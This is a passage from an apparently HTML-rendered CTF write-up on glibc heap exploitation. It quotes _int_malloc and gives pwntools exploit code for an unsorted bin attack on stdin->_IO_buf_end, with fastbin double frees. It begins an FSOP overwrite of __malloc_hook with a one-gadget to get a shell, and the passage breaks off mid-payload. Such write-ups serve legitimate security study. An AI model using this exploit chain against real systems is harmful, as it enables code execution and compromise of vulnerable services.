+&lt;span style=&#34;color:#a6e22e&#34;&gt;_int_malloc&lt;/span&gt; (mstate av, size_t bytes)
+{
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// It checks first fastbin then smallbin then unsorted bin
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (;; )
+    {
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; iters &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ((victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; unsorted_chunks (av))
+        {
+          bck &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk;
+          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (__builtin_expect (chunksize_nomask (victim) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; SIZE_SZ, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+              &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; __builtin_expect (chunksize_nomask (victim)
+				   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; av&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;system_mem, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
+            malloc_printerr (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;malloc(): memory corruption&amp;#34;&lt;/span&gt;);
+          size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunksize (victim);
+
+          &lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             If a small request, try to use last remainder if it is the
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             only chunk in unsorted bin.  This helps promote locality for
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             runs of consecutive small requests. This is the only
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             exception to best-fit, and applies only when there is
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;             no exact fit for a small chunk.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;           */&lt;/span&gt;
+
+          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (in_smallbin_range (nb) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+              bck &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; unsorted_chunks (av) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+              victim &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; av&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;last_remainder &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+              (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;) (size) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;) (nb &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; MINSIZE))
+            {
+              &lt;span style=&#34;color:#75715e&#34;&gt;/* split and reattach remainder */&lt;/span&gt;
+              remainder_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; nb;
+              remainder &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunk_at_offset (victim, nb);
+              unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remainder;
+              av&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;last_remainder &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remainder;
+              remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av);
+              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;in_smallbin_range (remainder_size))
+                {
+                  remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd_nextsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+                  remainder&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk_nextsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+                }
+
+              set_head (victim, nb &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PREV_INUSE &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+                        (av &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;main_arena &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; NON_MAIN_ARENA : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+              set_head (remainder, remainder_size &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; PREV_INUSE);
+              set_foot (remainder, remainder_size);
+
+              check_malloced_chunk (av, victim, nb);
+              &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p;
+            }
+
+          &lt;span style=&#34;color:#75715e&#34;&gt;/* remove from unsorted list */&lt;/span&gt;
+          unsorted_chunks (av)&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bck;
+          bck&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; unsorted_chunks (av);
+
+          &lt;span style=&#34;color:#75715e&#34;&gt;/* Take now instead of binning if exact fit */&lt;/span&gt;
+
+          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; nb)
+            {
+              set_inuse_bit_at_offset (victim, size);
+              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (av &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;main_arena)
+		set_non_main_arena (victim);
+&lt;span style=&#34;color:#75715e&#34;&gt;#if USE_TCACHE
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	      &lt;span style=&#34;color:#75715e&#34;&gt;/* Fill cache first, return to user only if cache fills.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		 We may return one of these chunks later.  */&lt;/span&gt;
+	      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (tcache_nb
+		  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; tcache&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;counts[tc_idx] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; mp_.tcache_count)
+		{
+		  tcache_put (victim, tc_idx);
+		  return_cached &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+		  &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;;
+		}
+	      &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+		{
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;              check_malloced_chunk (av, victim, nb);
+              &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; p;
+&lt;span style=&#34;color:#75715e&#34;&gt;#if USE_TCACHE
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		}
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            }
+
+	[...]
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;According to what I said earlier, the goal is to replace &lt;code&gt;stdin-&amp;gt;_IO_buf_end&lt;/code&gt; with &lt;code&gt;&amp;amp;unsortedbin&lt;/code&gt; which means we have to write to the backward pointer of the last chunk in the unsorted bin (chunk_2) &lt;code&gt;&amp;amp;stdin-&amp;gt;_IO_buf_end - 0x10&lt;/code&gt;. To do so we can trigger a write after free primitive by taking back &lt;code&gt;chunk_2&lt;/code&gt; from the unsorted bin to the fastbin:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Before:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x40: 0x555555608560 —▸ 0x5555556085a0 ◂— 0x0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;unsortedbin
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;all: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# pop it to access to chunk_1&lt;/span&gt;
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# restore valid fastbin chunk part of the 0x30 freelist&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# put it back to the fastbin &lt;/span&gt;
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ebca0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;))
+&lt;span style=&#34;color:#75715e&#34;&gt;# Write after free, &amp;amp;stdin-&amp;gt;_IO_buf_end = stdin + 0x40, minus 0x10 point to the fake header&lt;/span&gt;
+
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;After:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x7ffff7dcfca0 (main_arena+96) —▸ 0x5555556085e0 ◂— 0x7ffff7dcfca0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;unsortedbin
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;all [corrupted]
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;FD: 0x5555556085e0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x5555556085e0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;BK: 0x5555556085e0 —▸ 0x7ffff7dcfa30 (_IO_2_1_stdin_+48) ◂— 0x0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As you can read right above, the &lt;code&gt;chunk_2&lt;/code&gt; has its backward pointer set to &lt;code&gt;&amp;amp;stdin-&amp;gt;_IO_buf_end - 0x10&lt;/code&gt;. To achieve the partial unlink we just have to request a &lt;code&gt;0x30&lt;/code&gt; sized chunk with nothing in the fastbin freelists. That&amp;rsquo;s the last step of the unsortedbin attack, clean out the fastbin:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Before: same as above
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# == clean fastbin&lt;/span&gt;
+
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x40&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
+
+freexalloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;560&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;, doubleFree&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x30&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# == clean fastbin&lt;/span&gt;
+
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;fastbins
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x30: 0x0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x40: 0x0
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we just have to ask for a &lt;code&gt;0x30&lt;/code&gt; sized chunk:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1337&amp;#34;&lt;/span&gt;, hang&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;unsortedbin attack done on: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex(stdin &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enjoy your shell!&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;After:
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x7ffff7dcfa40 &amp;lt;_IO_2_1_stdin_+64&amp;gt;:	0x00007ffff7dcfca0 &amp;lt;- stdin-&amp;gt;_IO_buf_end
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0x7ffff7dcfca0 &amp;lt;main_arena+96&amp;gt;:	0x00005555556086b0 &amp;lt;- unsortedbin
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;fsop--profit&#34;&gt;FSOP + PROFIT&lt;/h2&gt;
+&lt;p&gt;The last part is very easy, we just have to overflow up to &lt;code&gt;&amp;amp;__malloc_hook&lt;/code&gt; to write the one-gadget:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;) 
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span&gt;) 
+io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send( 
+        &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ed8d0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffffffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3ebae0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x00000000ffffffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(libc &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3e82a0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 
+        pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p8(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x150&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;  
